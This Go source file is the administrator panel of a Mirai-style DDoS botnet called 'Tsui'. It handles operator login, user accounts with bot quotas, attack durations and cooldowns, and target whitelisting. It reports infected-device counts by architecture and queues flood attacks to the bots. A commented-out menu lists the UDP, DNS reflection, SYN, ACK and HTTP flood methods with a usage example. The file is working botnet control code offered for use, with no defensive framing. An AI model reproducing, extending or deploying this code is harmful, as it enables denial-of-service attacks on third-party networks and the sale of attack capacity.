package main

import (
	"fmt"
	"net"
	"strconv"
	"strings"
	"time"
    "io/ioutil"
)

type Admin struct {
	conn net.Conn
}

func NewAdmin(conn net.Conn) *Admin {
	return &Admin{conn}
}

func (this *Admin) Handle() {
    this.conn.Write([]byte("\033[?1049h"))
    this.conn.Write([]byte("\xFF\xFB\x01\xFF\xFB\x03\xFF\xFC\x22"))

defer func() {
	this.conn.Write([]byte("\033[?1049l"))
	}()
	message, err := ioutil.ReadFile("message.txt")
	if err != nil {
		return
	}

	prom := string(message)

	// Get username
	this.conn.Write([]byte("\033[2J\033[1;1H"))
	this.conn.Write([]byte("\x1b[38;5;160m        To Julie: Thank you for always being my friend       \r\n"))
	this.conn.Write([]byte("\x1b[38;5;160m                        .--. \r\n")) 
       this.conn.Write([]byte("\x1b[38;5;160m                       |o_o | \r\n"))
       this.conn.Write([]byte("\x1b[38;5;160m                       |:_/ | \r\n"))
       this.conn.Write([]byte("\x1b[38;5;160m                      //   \\ \\ \r\n"))
       this.conn.Write([]byte("\x1b[38;5;160m                     (|     | ) \r\n"))
       this.conn.Write([]byte("\x1b[38;5;160m                    /'\\ _  _/`\\ \r\n"))
       this.conn.Write([]byte("\x1b[38;5;160m                    \\___)=(___/ \r\n"))
       this.conn.Write([]byte("\x1b[38;5;160m        Be who you really are. Be strong.         \r\n"))
	this.conn.Write([]byte("\r\n"))
	this.conn.Write([]byte("\r\n"))
	this.conn.Write([]byte("\r\n"))
	this.conn.SetDeadline(time.Now().Add(60 * time.Second))
	this.conn.Write([]byte("\033[0;33mLogin As ?\033[\033[01;37m: \033[01;37m"))
	username, err := this.ReadLine(false)
	if err != nil {
		return
	}
	// Get password
	this.conn.SetDeadline(time.Now().Add(60 * time.Second))
	this.conn.Write([]byte("\033[0;33mYour Passcode?\033[\033[01;37m: \033[01;37m"))
	password, err := this.ReadLine(true)
	if err != nil {
		return
	}
	//Attempt  Login
	this.conn.SetDeadline(time.Now().Add(120 * time.Second))
	this.conn.Write([]byte("\r\n"))
	spinBuf := []byte{'-', '\\', '|', '/'}
	for i := 0; i < 15; i++ {
		this.conn.Write(append([]byte("\r\033[01;37mVerifying...\033[01;37m"), spinBuf[i%len(spinBuf)]))
		time.Sleep(time.Duration(200) * time.Millisecond)
	}
	this.conn.Write([]byte("\r\n"))

	//if credentials are incorrect output error and close session
	var loggedIn bool
	var userInfo AccountInfo
	if loggedIn, userInfo = database.TryLogin(username, password, this.conn.RemoteAddr()); !loggedIn {
		this.conn.Write([]byte("\r\033[01;90mError. IP logged. Try again Later .\r\n"))
		buf := make([]byte, 1)
		this.conn.Read(buf)
		return
	}
	// Header
	this.conn.Write([]byte("\r\n\033[0m"))
	go func() {
		i := 0
		for {
			var BotCount int
			if clientList.Count() > userInfo.maxBots && userInfo.maxBots != -1 {
				BotCount = userInfo.maxBots
			} else {
				BotCount = clientList.Count()
			}

			time.Sleep(time.Second)
			if _, err := this.conn.Write([]byte(fmt.Sprintf("\033]0; [%d] 僵尸数量/Devices Connected <-|-> User: %s\007", BotCount, username))); err != nil {
				this.conn.Close()
				break
			}
			i++
			if i%60 == 0 {
				this.conn.SetDeadline(time.Now().Add(120 * time.Second))
			}
		}
	}()

    this.conn.Write([]byte("\033[2J\033[1H")) //display main header
    this.conn.Write([]byte("\r\n"))
    this.conn.Write([]byte("\033[0;37mID： \033[0;32m" + username + "\033[0;37m \r\n"))
	this.conn.Write([]byte(fmt.Sprintf("\033[01;31mMessage from Admin: \033[0;37m%s\r\n", prom)))
    this.conn.Write([]byte("\r\n"))

	for {
		var botCatagory string
		var botCount int
		this.conn.Write([]byte("\033[01;37m\033[01;37m" + username + "\033[0;36m@\033[01;31mTsui\033[01;37m\033[01;37m:\033[01;37m \033[01;37m"))
		cmd, err := this.ReadLine(false)

		if err != nil || cmd == "exit" || cmd == "quit" {
			return
		}
		if cmd == "" {
			continue
		}

		if err != nil || cmd == "c" || cmd == "cls" || cmd == "clear" { // clear screen
			this.conn.Write([]byte("\033[2J\033[1H"))
			this.conn.Write([]byte("\r\n"))
			this.conn.Write([]byte("\r\n"))
			this.conn.Write([]byte("\x1b[38;5;160m        To Julie: Thank you for always being my friend       \r\n"))
	              this.conn.Write([]byte("\x1b[38;5;160m                        .--. \r\n")) 
                     this.conn.Write([]byte("\x1b[38;5;160m                       |o_o | \r\n"))
                     this.conn.Write([]byte("\x1b[38;5;160m                       |:_/ | \r\n"))
                     this.conn.Write([]byte("\x1b[38;5;160m                      //   \\ \\ \r\n"))
                     this.conn.Write([]byte("\x1b[38;5;160m                     (|     | ) \r\n"))
                     this.conn.Write([]byte("\x1b[38;5;160m                    /'\\ _  _/`\\ \r\n"))
                     this.conn.Write([]byte("\x1b[38;5;160m                    \\___)=(___/ \r\n"))
                     this.conn.Write([]byte("\x1b[38;5;160m        Be who you really are. Be strong.         \r\n"))
			this.conn.Write([]byte("\r\n"))
			this.conn.Write([]byte(fmt.Sprintf("\033[01;31mMessage from Admin: \033[0;0m%s\r\n", prom)))
			this.conn.Write([]byte("\r\n"))
			continue
		}
/*	fuck this skiddy shitty shiny dicky menu
		if err != nil || cmd == "METHODS" || cmd == "methods" || cmd == "?" {
			this.conn.Write([]byte("\r\n\033[0m"))
			this.conn.Write([]byte("\033[31mstdhex\033[97m:\033[0;36m STD六角攻击/Random STD HEX (UDP)  \r\n"))
			this.conn.Write([]byte("\033[31mplain\033[97m:\033[0;36m 针对更高 PPS 优化的 UDP 攻击/ UDP HIGH PPS  \r\n"))
			this.conn.Write([]byte("\033[31mudp\033[97m:\033[0;36m 标准 UDP 攻击Standard UDP  \r\n"))
			this.conn.Write([]byte("\033[31mdns\033[97m:\033[0;36m DNS 攻击/ DNS REFLECTION (UDP)  \r\n"))
			this.conn.Write([]byte("\033[31movh\033[97m:\033[0;36m OVH 十六进制攻击/ OVH UDP HEX (UDP)  \r\n"))

			this.conn.Write([]byte("\r\n\033[0m"))
			this.conn.Write([]byte("\033[31msyn\033[97m:\033[0;36m TCP SYN \r\n"))
			this.conn.Write([]byte("\033[31mack\033[97m:\033[0;36m TCP ACK \r\n"))
			this.conn.Write([]byte("\r\n\033[0m"))
			this.conn.Write([]byte("\033[31mhttp\033[97m:\033[0;36m Layer7 自定义攻击/ Custom Layer7  \r\n"))
			this.conn.Write([]byte("\r\n\033[0m"))
			continue
		}
*/
		if err != nil || cmd == "METHODS" || cmd == "methods" || cmd == "?" {
			this.conn.Write([]byte("\r\n\033[0m"))
			this.conn.Write([]byte("\033[31m ? \033[97m怎么使用/ HOW TO?  \033[97m\033[0;36m\r\n"))
			this.conn.Write([]byte("\r\n\033[0m"))
			this.conn.Write([]byte("\033[31m\033[0;36m Check example below :\r\n"))
			this.conn.Write([]byte("\033[31m\033[97m Example :\033[0;36m udp target time dport=53 \r\n"))
			this.conn.Write([]byte("\r\n\033[0m"))
			continue
		}

		if err != nil || cmd == "HELP" || cmd == "help" || cmd == "cd"{
			this.conn.Write([]byte("\r\n\033[0m"))
			this.conn.Write([]byte("\033[31mmethods\033[97m:\033[0;36m methods menu \r\n"))
			this.conn.Write([]byte("\033[31mblock / unblock \033[97m:\033[0;36m block unblock attacks for admins\r\n"))
			this.conn.Write([]byte("\033[31mbots\033[97m:\033[0;36m show botcount & arch\r\n"))

			this.conn.Write([]byte("\033[31maddadmin\033[97m:\033[0;36m for owner only\r\n"))
			this.conn.Write([]byte("\033[31maddbasic\033[97m:\033[0;36m for owner only\r\n"))
			this.conn.Write([]byte("\033[31mremoveuser\033[97m:\033[0;36m for owner only\r\n"))
			this.conn.Write([]byte("\r\n\033[0m"))
			continue
		}


		if userInfo.admin == 1 && cmd == "block" {
			this.conn.Write([]byte("\033[0mTarget ip :\033[01;37m "))
			new_pr, err := this.ReadLine(false)
			if err != nil {
				return
			}
			this.conn.Write([]byte("\033[0mNet Mask :\033[01;37m "))
			new_nm, err := this.ReadLine(false)
			if err != nil {
				return
			}
			this.conn.Write([]byte("\033[0mWe are blocking all attacks at this ip: \033[97m" + new_pr + "/" + new_nm + "\r\n\033[0mYes? \033[01;37m(\033[01;32my\033[01;37m/\033[01;31mn\033[01;37m) "))
			confirm, err := this.ReadLine(false)
			if err != nil {
				return
			}
			if confirm != "y" {
				continue
			}
			if !database.BlockRange(new_pr, new_nm) {
				this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "发生未知错误101/Error Code 101.")))
			} else {
				this.conn.Write([]byte("\033[32;1mDone!\033[0m\r\n"))
			}
			continue
		}

		if userInfo.admin == 1 && cmd == "unblock" {
			this.conn.Write([]byte("\033[0mRemove Whitelist IP: \033[01;37m"))
			rm_pr, err := this.ReadLine(false)
			if err != nil {
				return
			}
			this.conn.Write([]byte("\033[0mNet Mask:\033[01;37m "))
			rm_nm, err := this.ReadLine(false)
			if err != nil {
				return
			}
			this.conn.Write([]byte("\033[0mAllowing all attempts to attack this ip: \033[97m" + rm_pr + "/" + rm_nm + "\r\n\033[0mYes? \033[01;37m(\033[01;32my\033[01;37m/\033[01;31mn\033[01;37m) "))
			confirm, err := this.ReadLine(false)
			if err != nil {
				return
			}
			if confirm != "y" {
				continue
			}
			if !database.UnBlockRange(rm_pr) {
				this.conn.Write([]byte(fmt.Sprintf("\033[01;31mError Code 102 \r\n")))
			} else {
				this.conn.Write([]byte("\033[01;32mDone!\r\n"))
			}
			continue
		}		

		botCount = userInfo.maxBots

		if userInfo.admin == 1 && cmd == "addbasic" {
			this.conn.Write([]byte("\033[0mUser:\033[01;37m "))
			new_un, err := this.ReadLine(false)
			if err != nil {
				return
			}
			this.conn.Write([]byte("\033[0mPass:\033[01;37m "))
			new_pw, err := this.ReadLine(false)
			if err != nil {
				return
			}
			this.conn.Write([]byte("\033[0mAllowed Bots\033[01;37m(\033[0m-1 for all:\033[01;37m)\033[0m:\033[01;37m "))
			max_bots_str, err := this.ReadLine(false)
			if err != nil {
				return
			}
			max_bots, err := strconv.Atoi(max_bots_str)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "Can not calculate the botcount !")))
				continue
			}
			this.conn.Write([]byte("\033[0mAllowed Attack Duration\033[01;37m(\033[0m-1 for none\033[01;37m)\033[0m:\033[01;37m "))
			duration_str, err := this.ReadLine(false)
			if err != nil {
				return
			}
			duration, err := strconv.Atoi(duration_str)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "Error prasing time limit :103")))
				continue
			}
			this.conn.Write([]byte("\033[0mCooldown\033[01;37m(\033[0m0 For None\033[01;37m)\033[0m:\033[01;37m "))
			cooldown_str, err := this.ReadLine(false)
			if err != nil {
				return
			}
			cooldown, err := strconv.Atoi(cooldown_str)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "Error parasing cooldown time : 104")))
				continue
			}
			this.conn.Write([]byte("\033[0m- Ready? - \r\n- User - \033[01;37m" + new_un + "\r\n\033[0m- Pass - \033[01;37m" + new_pw + "\r\n\033[0m- Bots - \033[01;37m" + max_bots_str + "\r\n\033[0m- Duration - \033[01;37m" + duration_str + "\r\n\033[0m- Cooldown - \033[01;37m" + cooldown_str + "   \r\n\033[0mConfirm? \033[01;37m(\033[01;32my\033[01;37m/\033[01;31mn\033[01;37m) "))
			confirm, err := this.ReadLine(false)
			if err != nil {
				return
			}
			if confirm != "y" {
				continue
			}
			if !database.CreateBasic(new_un, new_pw, max_bots, duration, cooldown) {
				this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "Error on create : code 707")))
			} else {
				this.conn.Write([]byte("\033[32;1mAll done.\033[0m\r\n"))
			}
			continue
		}
		if userInfo.admin == 1 && cmd == "addbasic" {
			this.conn.Write([]byte("\033[0mUser:\033[01;37m "))
			new_un, err := this.ReadLine(false)
			if err != nil {
				return
			}
			this.conn.Write([]byte("\033[0mPass:\033[01;37m "))
			new_pw, err := this.ReadLine(false)
			if err != nil {
				return
			}
			this.conn.Write([]byte("\033[0mBotcount\033[01;37m(\033[0m-1 For all\033[01;37m)\033[0m:\033[01;37m "))
			max_bots_str, err := this.ReadLine(false)
			if err != nil {
				return
			}
			max_bots, err := strconv.Atoi(max_bots_str)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "Botcount error:401")))
				continue
			}
			this.conn.Write([]byte("\033[0mTimelimit\033[01;37m(\033[0m-1 for none\033[01;37m)\033[0m:\033[01;37m "))
			duration_str, err := this.ReadLine(false)
			if err != nil {
				return
			}
			duration, err := strconv.Atoi(duration_str)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "failed to proccese requests")))
				continue
			}
			this.conn.Write([]byte("\033[0mCooldown\033[01;37m(\033[0m0 for none\033[01;37m)\033[0m:\033[01;37m "))
			cooldown_str, err := this.ReadLine(false)
			if err != nil {
				return
			}
			cooldown, err := strconv.Atoi(cooldown_str)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "Error on create")))
				continue
			}
			this.conn.Write([]byte("\033[0m- Info - \r\n- User - \033[01;37m" + new_un + "\r\n\033[0m- Pass - \033[01;37m" + new_pw + "\r\n\033[0m- Bots - \033[01;37m" + max_bots_str + "\r\n\033[0m- Duration- \033[01;37m" + duration_str + "\r\n\033[0m- Cooldown - \033[01;37m" + cooldown_str + "   \r\n\033[0mTrue? \033[01;37m(\033[01;32my\033[01;37m/\033[01;31mn\033[01;37m) "))
			confirm, err := this.ReadLine(false)
			if err != nil {
				return
			}
			if confirm != "y" {
				continue
			}
			if !database.CreateBasic(new_un, new_pw, max_bots, duration, cooldown) {
				this.conn.Write([]byte(fmt.Sprintf("\033[01;31mError unknown\r\n")))
				this.conn.Write([]byte("\033[32;1mDone.\033[0m\r\n"))
			}
			continue
		}

		if userInfo.admin == 1 && cmd == "removeuser" {
			this.conn.Write([]byte("\033[01;37mUser: \033[0;35m"))
			rm_un, err := this.ReadLine(false)
			if err != nil {
				return
			}
			this.conn.Write([]byte(" \033[01;37mR U Sure \033[01;37m" + rm_un + "?\033[01;37m(\033[01;32my\033[01;37m/\033[01;31mn\033[01;37m) "))
			confirm, err := this.ReadLine(false)
			if err != nil {
				return
			}
			if confirm != "y" {
				continue
			}
			if !database.RemoveUser(rm_un) {
				this.conn.Write([]byte(fmt.Sprintf("\033[01;31mPermisson Denied\r\n")))
			} else {
				this.conn.Write([]byte("\033[01;32mDone!\r\n"))
			}
			continue
		}

		botCount = userInfo.maxBots

		if userInfo.admin == 1 && cmd == "addadmin" {
			this.conn.Write([]byte("\033[0mUser:\033[01;37m "))
			new_un, err := this.ReadLine(false)
			if err != nil {
				return
			}

			this.conn.Write([]byte("\033[0mPass:\033[01;37m "))
			new_pw, err := this.ReadLine(false)
			if err != nil {
				return
			}

			this.conn.Write([]byte("\033[0mBotcount\033[01;37m(\033[0m-1 For All\033[01;37m)\033[0m:\033[01;37m "))
			max_bots_str, err := this.ReadLine(false)
			if err != nil {
				return
			}

			max_bots, err := strconv.Atoi(max_bots_str)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "Error on parasing BotCount")))
				continue
			}

			this.conn.Write([]byte("\033[0mDuration\033[01;37m(\033[0m-1 for none\033[01;37m)\033[0m:\033[01;37m "))
			duration_str, err := this.ReadLine(false)
			if err != nil {
				return
			}

			duration, err := strconv.Atoi(duration_str)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "Failed Code 103")))
				continue
			}

			this.conn.Write([]byte("\033[0mCooldown\033[01;37m(\033[0m0 无\033[01;37m)\033[0m:\033[01;37m "))
			cooldown_str, err := this.ReadLine(false)
			if err != nil {
				return
			}

			cooldown, err := strconv.Atoi(cooldown_str)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "Failed Code 104")))
				continue
			}

			this.conn.Write([]byte("\033[0m- Sure? - \r\n- User - \033[01;37m" + new_un + "\r\n\033[0m- Pass - \033[01;37m" + new_pw + "\r\n\033[0m- Bots - \033[01;37m" + max_bots_str + "\r\n\033[0m- MAX - \033[01;37m" + duration_str + "\r\n\033[0m- Cooldown - \033[01;37m" + cooldown_str + "   \r\n\033[0mConfirm? \033[01;37m(\033[01;32my\033[01;37m/\033[01;31mn\033[01;37m) "))
			confirm, err := this.ReadLine(false)
			if err != nil {
				return
			}

			if confirm != "y" {
				continue
			}

			if !database.CreateAdmin(new_un, new_pw, max_bots, duration, cooldown) {
				this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "Error On Create.")))
			} else {
				this.conn.Write([]byte("\033[32;1mDone.\033[0m\r\n"))
			}

			continue
		}

		if cmd == "bots" || cmd == "BOTS" || cmd == "botcount" {
			this.conn.Write([]byte("\033[01;37m  \033[0m\r\n"))
			botCount = clientList.Count()
			m := clientList.Distribution()
			for k, v := range m {
				this.conn.Write([]byte(fmt.Sprintf("\x1b[0;31m%s: \x1b[01;37m%d\033[0m\r\n\033[0m", k, v)))
			}

			this.conn.Write([]byte(fmt.Sprintf("\033[01;37mTotal: \033[01;37m[\033[0;31m%d\033[01;37m]\r\n\033[0m", botCount)))
			this.conn.Write([]byte("\033[01;37m  \033[0m\r\n"))
			continue
		}

		if cmd[0] == '-' {
			countSplit := strings.SplitN(cmd, " ", 2)
			count := countSplit[0][1:]
			botCount, err = strconv.Atoi(count)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[31;1mError! \"%s\"\033[0m\r\n", count)))
				continue
			}
			if userInfo.maxBots != -1 && botCount > userInfo.maxBots {
				this.conn.Write([]byte(fmt.Sprintf("\033[31;1mTrying to use MORE BOTS THAN ALLOWED!\033[0m\r\n")))
				continue
			}
			cmd = countSplit[1]
		}

		atk, err := NewAttack(cmd, userInfo.admin)
		if err != nil {
			this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", err.Error())))
		} else {
			buf, err := atk.Build()
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", err.Error())))
			} else {
				if can, err := database.CanLaunchAttack(username, atk.Duration, cmd, botCount, 0); !can {
					this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", err.Error())))
				} else if !database.ContainsWhitelistedTargets(atk) {
					clientList.QueueBuf(buf, botCount, botCatagory)
					var YotCount int
					if clientList.Count() > userInfo.maxBots && userInfo.maxBots != -1 {
						YotCount = userInfo.maxBots
					} else {
						YotCount = clientList.Count()
					}
					this.conn.Write([]byte(fmt.Sprintf("\033[0;31mAttack Launched! \033[0;36m%d \033[0;31mBots Used\r\n", YotCount)))
				} else {
					this.conn.Write([]byte(fmt.Sprintf("\033[0;31mThe IP space is whitelisted ! \033[0;31m\r\n")))
					fmt.Println("" + username + " Trying to attack whitelist IP")
				}
			}
		}
	}
}




func (this *Admin) ReadLine(masked bool) (string, error) {
	buf := make([]byte, 1024)
	bufPos := 0

	for {

		if bufPos > 1023 { //credits to Insite <3
			fmt.Printf("Sup?")
			return "", *new(error)
		}

		n, err := this.conn.Read(buf[bufPos : bufPos+1])
		if err != nil || n != 1 {
			return "", err
		}
		if buf[bufPos] == '\xFF' {
			n, err := this.conn.Read(buf[bufPos : bufPos+2])
			if err != nil || n != 2 {
				return "", err
			}
			bufPos--
		} else if buf[bufPos] == '\x7F' || buf[bufPos] == '\x08' {
			if bufPos > 0 {
				this.conn.Write([]byte(string(buf[bufPos])))
				bufPos--
			}
			bufPos--
		} else if buf[bufPos] == '\r' || buf[bufPos] == '\t' || buf[bufPos] == '\x09' {
			bufPos--
		} else if buf[bufPos] == '\n' || buf[bufPos] == '\x00' {
			this.conn.Write([]byte("\r\n"))
			return string(buf[:bufPos]), nil
		} else if buf[bufPos] == 0x03 {
			this.conn.Write([]byte("^C\r\n"))
			return "", nil
		} else {
			if buf[bufPos] == '\x1B' {
				buf[bufPos] = '^'
				this.conn.Write([]byte(string(buf[bufPos])))
				bufPos++
				buf[bufPos] = '['
				this.conn.Write([]byte(string(buf[bufPos])))
			} else if masked {
				this.conn.Write([]byte("*"))
			} else {
				this.conn.Write([]byte(string(buf[bufPos])))
			}
		}
		bufPos++
	}
	return string(buf), nil
}
